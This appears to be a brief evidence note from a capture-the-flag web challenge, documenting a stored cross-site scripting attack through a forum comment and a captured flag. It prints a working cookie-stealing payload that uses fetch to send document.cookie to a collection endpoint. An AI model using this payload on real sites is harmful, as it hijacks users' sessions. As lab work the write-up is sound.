# Evidence — Stored XSS

- Sink: `GET /api/collect?c=<data>` logs input and hands it back on GET (my exfil server).
- Injection point: forum comment (HTML/JS stored raw), e.g. `/forum/6viy7xi64gxpan3`.
- Payload: [../exploit.html](../exploit.html) — `fetch("/api/collect?c="+document.cookie)`.
- Bot capture (from `/api/collect`): `flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` (HeadlessChrome, 127.0.0.1).
